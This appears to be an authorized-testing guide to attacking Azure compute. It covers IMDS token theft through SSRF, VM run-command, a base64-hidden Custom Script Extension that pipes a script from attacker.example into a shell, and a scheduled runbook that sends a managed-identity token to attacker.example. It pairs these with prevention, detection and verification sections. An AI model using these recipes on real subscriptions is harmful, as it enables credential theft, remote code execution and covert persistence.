# VM and Compute Attacks

> [!CAUTION]
> This file is for authorized security testing of Azure subscriptions and tenants you own or have explicit written permission to assess. Do not use these techniques against subscriptions, tenants, or services you do not own or have permission to test.

## 1. Overview

Azure compute is a family of services, all of which run code and all of which can be given an identity:

- **Virtual Machines (VMs)** - full OS instances inside a VNet, with a managed disk, a NIC, an NSG, and an optional managed identity.
- **Virtual Machine Scale Sets (VMSS)** - a group of identical VMs behind a load balancer, managed as one resource.
- **App Service** - a managed web hosting platform for .NET, Java, Node.js, Python, PHP, and Ruby applications. Runs on Windows or Linux, and can be given a managed identity.
- **Function Apps** - serverless compute with a consumption plan or a dedicated plan. Can be given a managed identity, and can be triggered by HTTP, a timer, a queue, or an event.
- **Container Instances (ACI)** - a single-container runtime, no orchestration.
- **Azure Kubernetes Service (AKS)** - a managed Kubernetes cluster; covered in detail in `04 Kubernetes-Cloud/`, referenced here only for the pivot.
- **Azure Automation** - runbooks (PowerShell, Python) that run on a schedule or on demand, with a managed identity or a Run As account.

The trust boundary in every one of these services is the same: the **managed identity** attached to the resource, and the **Azure RBAC role assignment** on that identity. A VM with a system-assigned identity that has `Contributor` on a subscription is a VM whose compromise is a subscription compromise. A Function App with a user-assigned identity that has `Key Vault Secrets User` is a Function App whose SSRF is a Key Vault leak.

The managed identity token is issued by the **Azure Instance Metadata Service (IMDS)** at `http://169.254.169.254/metadata/identity/oauth2/token`. Any code running on the resource (including a web app with an SSRF) can request a token for any resource the identity has access to. The `Metadata: true` header is the only requirement, and it is a client-side requirement, not an authorization check.

The second trust boundary is the **control plane**: the Azure Resource Manager API. An identity with `Microsoft.Compute/virtualMachines/runCommand/action` can run a shell command on any VM in its scope. An identity with `Microsoft.Web/sites/config/list/action` can read the App Service's connection strings and app settings. An identity with `Microsoft.Automation/automationAccounts/runbooks/publish/action` can publish a runbook that runs with the Automation Account's identity.

This file covers the attack surface of Azure compute: how IMDS tokens are stolen, how the control plane is abused, how extensions and run-commands are used for persistence, and how the defensive controls (managed identity scope, JIT VM access, Defender for Servers) are configured.

## 2. Reconnaissance / Enumeration

### 2.1 Control-plane enumeration

With any valid Azure credential, the compute resources visible to the identity are enumerable with the Azure CLI:

```bash
# VMs with their identity type and public IPs
az vm list --show-details --query '[].{Name:name,ResourceGroup:resourceGroup,PublicIps:publicIps,PrivateIps:privateIps,Identity:identity.type}'

# VM extensions (custom script, run command, etc.)
az vm extension list --vm-name <vm> --resource-group <rg>

# App Services and Function Apps, with their identity and inbound access
az webapp list --query '[].{Name:name,State:state,Identity:identity.type,PublicNetworkAccess:publicNetworkAccess}'
az functionapp list --query '[].{Name:name,State:state,Identity:identity.type}'

# App Service app settings (may contain connection strings and secrets)
az webapp config appsettings list --name <app> --resource-group <rg>

# Automation Accounts and their runbooks
az automation account list --query '[].{Name:name,ResourceGroup:resourceGroup,Identity:identity.type}'
az automation runbook list --automation-account-name <aa> --resource-group <rg>
```

### 2.2 Data-plane enumeration of an App Service

An App Service has two endpoints that matter:

- **The public endpoint** (`https://<app>.azurewebsites.net`) - the application.
- **The SCM / Kudu endpoint** (`https://<app>.scm.azurewebsites.net`) - the deployment and diagnostic API. Access is controlled by the same Entra ID / publish profile, but it exposes a file browser, a process list, a command shell (for Windows apps), and the deployment logs. A leak of the publish profile (which is a set of credentials) is a full App Service compromise.

```bash
# Check whether the SCM endpoint is reachable without credentials
curl -s -o /dev/null -w "%{http_code}\n" "https://<app>.scm.azurewebsites.net/"

# With a publish profile (username + password), use the Kudu API
curl -s -u '$<app>':'<publish-password>' "https://<app>.scm.azurewebsites.net/api/command" \
    -H "Content-Type: application/json" \
    -d '{"command":"whoami","dir":"site\\wwwroot"}'
```

### 2.3 Network-level enumeration

A VM with a public IP exposes whatever its NSG allows. The first step is a port scan, plus a check for the Azure-specific metadata endpoint (which is only reachable from inside the VM, not from the internet, but the scan reveals the open ports of the application).

```bash
# Standard port scan
nmap -p- --min-rate 5000 -T4 <public-ip>

# Service and version detection
nmap -sV -sC -p 22,80,443,3389,5985,5986 <public-ip>
```

### 2.4 Managed identity enumeration

Every compute resource with a managed identity has a principal ID, an object ID, and (for user-assigned identities) a client ID. Enumerating the identity's role assignments is the fastest way to understand the blast radius of a compromise:

```bash
# For a VM: get the identity's principal ID
PRINCIPAL=$(az vm show --name <vm> --resource-group <rg> --query identity.principalId -o tsv)

# Role assignments for that principal
az role assignment list --assignee "$PRINCIPAL" --all --output table
```

A `Contributor` on the subscription, or a `Key Vault Secrets User` on a sensitive vault, is the difference between a host-level compromise and a tenant-level one.

## 3. Common Attack Vectors

### 3.1 IMDS token theft via SSRF

The Azure Instance Metadata Service is reachable from every VM, App Service, Function App, and container instance at `http://169.254.169.254/metadata/identity/oauth2/token`. The only requirement is the header `Metadata: true`. An SSRF in a web application on any of these services can request a token for the managed identity.

The token is a full bearer token for the Azure Resource Manager API, Key Vault, Microsoft Graph, or any other resource the identity has access to. It is short-lived (around one hour), but it is enough to enumerate the identity's permissions and pivot to the resources it can reach.

### 3.2 Over-permissive managed identity

The most common Azure compute misconfiguration is a managed identity with a role assignment that is broader than the workload needs:

- A VM with `Contributor` on the subscription instead of `Reader` on a single resource group.
- An App Service with `Owner` on the subscription instead of `Key Vault Secrets User` on a single vault.
- A Function App with `Storage Blob Data Contributor` on every storage account in the subscription.

Every one of these is a workload compromise that escalates to a subscription or tenant compromise.

### 3.3 Custom Script Extension and Run Command

Two control-plane features execute arbitrary code on a VM:

- **`Microsoft.Compute/virtualMachines/extensions/write`** - installs an extension. The `CustomScriptExtension` (Windows) and `CustomScript` (Linux) extensions download a script from a URL and execute it as root or SYSTEM.
- **`Microsoft.Compute/virtualMachines/runCommand/action`** - runs a shell command on the VM, synchronously, and returns the output. The `RunShellScript` (Linux) and `RunPowerShellScript` (Windows) commands are the standard way to execute code without SSH or RDP.

Both are auditable in the Azure Activity log, but both are also frequently granted to roles that should not have them.

### 3.4 App Service deployment abuse

An App Service has several deployment paths:

- **Kudu / SCM** - the deployment API. A publish profile is a set of credentials that gives full access to the app's files and (for Windows) a command shell.
- **Deployment slots** - a staging slot with a different hostname, often with weaker network restrictions and a different identity.
- **Deployment center** - a CI/CD integration (GitHub, Azure Repos, Bitbucket). A compromised CI/CD token can deploy attacker code to the app.

### 3.5 Extension and runbook persistence

An attacker who has `Microsoft.Compute/virtualMachines/extensions/write` can install a Custom Script Extension that runs on every VM restart, which is a persistence mechanism that survives a reboot. An attacker who has `Microsoft.Automation/automationAccounts/runbooks/*` can publish a runbook that runs on a schedule with the Automation Account's identity, which is a persistence mechanism outside the VM entirely.

### 3.6 AKS pivot

An AKS cluster has two identities: the **cluster identity** (used by the control plane to manage Azure resources) and the **kubelet identity** (used by the nodes to pull images and read secrets). A compromised pod can reach the node's IMDS and steal the kubelet identity's token, which grants access to the ACR, the Key Vault, and any other resource the kubelet identity can reach. The AKS-specific attack surface is covered in `04 Kubernetes-Cloud/`; this file covers only the pivot from a VM or App Service into AKS.

## 4. Exploitation Recipes

### 4.1 From App Service SSRF to IMDS managed identity token

Precondition: an App Service (or Function App) with a system-assigned or user-assigned managed identity, and an SSRF vulnerability in the application.

```bash
# IMDS token request via SSRF
# The Metadata: true header is required
curl -s -H "Metadata: true" \
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

Expected response:

```json
{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs...",
  "expires_in": "3599",
  "expires_on": "1730000000",
  "not_before": "1729996400",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer"
}
```

The token is a bearer credential for the Azure Resource Manager API. Enumerate the identity's role assignments to understand the blast radius:

```bash
# What subscriptions can this identity see?
curl -s -H "Authorization: Bearer <access_token>" \
    "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[].displayName'
```

### 4.2 Run Command on a VM

Precondition: `Microsoft.Compute/virtualMachines/runCommand/action` on the VM.

```bash
# Execute a shell command on a Linux VM
az vm run-command invoke --name <vm> --resource-group <rg> \
    --command-id RunShellScript \
    --scripts 'id; hostname; cat /etc/passwd' \
    --query 'value[0].message' -o tsv

# Execute a PowerShell command on a Windows VM
az vm run-command invoke --name <vm> --resource-group <rg> \
    --command-id RunPowerShellScript \
    --scripts 'whoami; Get-Process' \
    --query 'value[0].message' -o tsv
```

Expected output of the Linux command (truncated):

```text
uid=0(root) gid=0(root) groups=0(root)
<vm-hostname>
root:x:0:0:root:/root:/bin/bash
...
```

### 4.3 Custom Script Extension for persistence

Precondition: `Microsoft.Compute/virtualMachines/extensions/write` on the VM. The extension runs at install time, and again on every VM restart if `autoUpgradeMinorVersion` is true and the publisher updates the extension.

```bash
# Install a Custom Script Extension that runs on every boot
az vm extension set \
    --vm-name <vm> \
    --resource-group <rg> \
    --name customScript \
    --publisher Microsoft.Azure.Extensions \
    --settings '{"script":"IyEvYmluL2Jhc2gKY3VybCAtcyBodHRwOi8vYXR0YWNrZXIuZXhhbXBsZS9iZWFjb24gfCBzaAo="}' \
    --protected-settings '{}'
```

The `script` field is base64-encoded. After the extension is installed, it runs at the OS level as root (Linux) or SYSTEM (Windows), and its execution is not visible to the VM's application logs. The Azure Activity log records the extension installation, but not the script content.

### 4.4 App Service SCM shell

Precondition: the App Service publish profile (username + password), or an Entra ID identity with `Microsoft.Web/sites/publish/action` (which can retrieve the publish profile).

```bash
# Retrieve the publish profile (requires Microsoft.Web/sites/publish/action)
az webapp deployment list-publishing-profiles --name <app> --resource-group <rg> --xml

# Use the Kudu command API with the publish credentials
curl -s -u '$<app>':'<publish-password>' \
    "https://<app>.scm.azurewebsites.net/api/command" \
    -H "Content-Type: application/json" \
    -d '{"command":"whoami","dir":"site\\wwwroot"}'
```

For a Windows App Service, the SCM command API is a full command shell. For a Linux App Service, it is a bash shell inside the container. In both cases, the shell runs as the app's identity, which can reach the app's environment variables (including `MSI_ENDPOINT` and `MSI_SECRET`) and therefore the managed identity token.

### 4.5 Automation Account runbook for persistence

Precondition: `Microsoft.Automation/automationAccounts/runbooks/*` on an Automation Account with a managed identity.

```bash
# Create a PowerShell runbook that runs on a schedule
cat > /tmp/backdoor.ps1 <<'EOF'
$token = Invoke-RestMethod -Uri "$env:IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" -Headers @{ "Metadata" = "true" }
Invoke-RestMethod -Uri "https://attacker.example/exfil" -Method Post -Body ($token | ConvertTo-Json)
EOF

az automation runbook create --automation-account-name <aa> --resource-group <rg> --name backdoor --type PowerShell
az automation runbook replace-content --automation-account-name <aa> --resource-group <rg> --name backdoor --content @/tmp/backdoor.ps1
az automation runbook publish --automation-account-name <aa> --resource-group <rg> --name backdoor

# Schedule it to run every hour
az automation schedule create --automation-account-name <aa> --resource-group <rg> --name hourly --frequency Hour --interval 1
az automation job schedule create --automation-account-name <aa> --resource-group <rg> --runbook-name backdoor --schedule-name hourly
```

The runbook runs with the Automation Account's managed identity, outside any VM. It survives VM rebuilds and is invisible to endpoint detection.

## 5. Post-Exploitation

After obtaining a compute foothold or a managed identity token, the attacker's priorities are persistence, privilege escalation, and lateral movement.

- **Persistence via VM extension:** a Custom Script Extension that runs on every boot, installed with `Microsoft.Compute/virtualMachines/extensions/write`.
- **Persistence via runbook:** a scheduled runbook in an Automation Account that runs with the Automation Account's identity.
- **Persistence via App Service deployment:** a deployment from a compromised CI/CD token, or a modified `web.config` / `appsettings.json` that runs a reverse shell on app start.
- **Privilege escalation:** if the managed identity has `Microsoft.Authorization/roleAssignments/write` on a scope, it can assign itself (or a new principal) a higher role. If it has `Microsoft.ManagedIdentity/userAssignedIdentities/assign/action`, it can attach a more privileged user-assigned identity to a resource it controls.
- **Lateral movement:** the managed identity token can reach Key Vault (secrets), Storage (data), SQL (databases), and Microsoft Graph (directory). Each is a separate pivot.

## 6. Preventive Controls

- **Scope managed identities to the minimum.** A VM should have `Reader` on its own resource group, not `Contributor` on the subscription. A Function App should have `Key Vault Secrets User` on a single vault, not `Owner` on the tenant. This is the single most important control in this file.
- **Block IMDS access from application code that does not need it.** For App Service and Function App, use the `IDENTITY_ENDPOINT` and `IDENTITY_HEADER` environment variables instead of IMDS, and restrict the app's outbound network to the services it needs. IMDS is not blockable at the network level (it is link-local), but application-layer controls (WAF, SSRF protection) reduce the exposure.
- **Use Just-In-Time (JIT) VM access.** Defender for Cloud's JIT feature opens the management port (22, 3389) only for an approved source IP and a limited time window. This eliminates the standing open port.
- **Restrict `runCommand` and `extensions/write`.** These are code-execution primitives. Grant them only to a dedicated operations role, and audit every use.
- **Disable the SCM endpoint for production apps that do not need it.** `az webapp config set --name <app> --resource-group <rg> --scm-ip-security-restrictions` with an allowlist, or `az resource update --set properties.scmSiteAlsoStopped=true`.
- **Require managed identity for CI/CD.** OIDC federation (GitHub Actions, Azure DevOps) instead of a publish profile with a long-lived password.
- **Enable Defender for Servers and Defender for App Service.** The former detects anomalous processes on VMs; the latter detects anomalous requests to App Service and Function App.

## 7. Detection Controls

The Azure Activity log records every control-plane operation on a compute resource. The VM's own logs (Windows Event Log, Linux syslog) are visible through Defender for Servers, Log Analytics, or the VM's diagnostic settings.

- **Azure Activity log** - alert on: `Microsoft.Compute/virtualMachines/runCommand/action`, `Microsoft.Compute/virtualMachines/extensions/write`, `Microsoft.Compute/virtualMachines/extensions/delete`, `Microsoft.Web/sites/publish/action`, `Microsoft.Web/sites/config/write` (app settings change), `Microsoft.Automation/automationAccounts/runbooks/publish/action`.
- **Defender for Servers** - alerts on: suspicious process execution, suspicious network connections, fileless attack toolkit, suspicious use of `curl` / `wget`, crypto-mining behavior. This is the layer that catches the payload after the control-plane event.
- **Defender for App Service** - alerts on: suspicious web requests, command injection, SQL injection, and the `MSI` endpoint access pattern from an unusual process.
- **Entra ID sign-in logs** - a sign-in from a managed identity is a service principal sign-in. Alert on a service principal sign-in from a new IP or a new user agent, which may indicate a token theft.
- **Azure Activity log for `Microsoft.ManagedIdentity/*`** - a user-assigned identity being attached to a resource it has never been attached to is a lateral-movement indicator.

## 8. Verification

Read-only checks to confirm the preventive controls are in place:

```bash
# Managed identities with Owner or Contributor at subscription scope
az role assignment list --scope "/subscriptions/<subscription-id>" \
    --query "[?roleDefinitionName=='Owner' || roleDefinitionName=='Contributor'].{Principal:principalName,Type:principalType,Role:roleDefinitionName}" --output table

# VMs with public IPs
az vm list --show-details --query '[?publicIps!=null].{Name:name,PublicIp:publicIps,ResourceGroup:resourceGroup}'

# App Services with the SCM endpoint publicly reachable
az webapp list --query '[].{Name:name,ResourceGroup:resourceGroup,ScmIpSecurityRestrictions:siteConfig.scmIpSecurityRestrictions}'

# App Services with publish profiles (any publish profile is a credential)
az webapp deployment list-publishing-profiles --name <app> --resource-group <rg> --xml
```

Expected result: no managed identity with `Owner` or `Contributor` at the subscription scope unless it is a documented break-glass identity; every VM's management port closed to the internet (JIT or Bastion); the SCM endpoint restricted to an allowlist; no publish profile with a long-lived password (use OIDC instead).

## 9. Certification Alignment

- **Microsoft Certified: Azure Security Engineer Associate (AZ-500)** - compute security, managed identity, JIT, Defender for Servers.
- **Microsoft Certified: Azure Administrator Associate (AZ-104)** - VM management, App Service, Automation Accounts.
- **Microsoft Certified: Azure Solutions Architect Expert (AZ-305)** - identity architecture, network segmentation, managed identity design.
- **CompTIA Security+** - host hardening, access control, least privilege.

## 10. Production Notes

- The managed identity is the trust anchor for every Azure compute resource. Its scope is the blast radius of a compromise. Keep it separate per resource, per application, and per environment.
- IMDS is link-local and is not captured by NSG flow logs or VNet flow logs. The compensating control is Defender for Servers' anomaly detection, not network monitoring.
- `runCommand` is synchronous and returns the output to the caller. It is the fastest way to execute code on a VM, and it is also the most auditable (the Azure Activity log records the full command). An attacker who wants stealth uses an extension, not a run command.
- The App Service SCM endpoint is a full deployment API. It is frequently left open in production because "it works", and it is one of the most common App Service findings in real assessments.
- The Automation Account runbook is a persistence mechanism that lives outside the VM. Rebuilding the VM does not remove it. Audit Automation Accounts as part of every incident-response playbook.

## 11. References

- Azure Virtual Machines documentation - https://learn.microsoft.com/en-us/azure/virtual-machines/
- Azure managed identities - https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/
- Azure App Service documentation - https://learn.microsoft.com/en-us/azure/app-service/
- Azure Functions documentation - https://learn.microsoft.com/en-us/azure/azure-functions/
- Azure Automation documentation - https://learn.microsoft.com/en-us/azure/automation/
- Microsoft Defender for Servers - https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-servers-introduction
- Microsoft Defender for App Service - https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-app-service-introduction
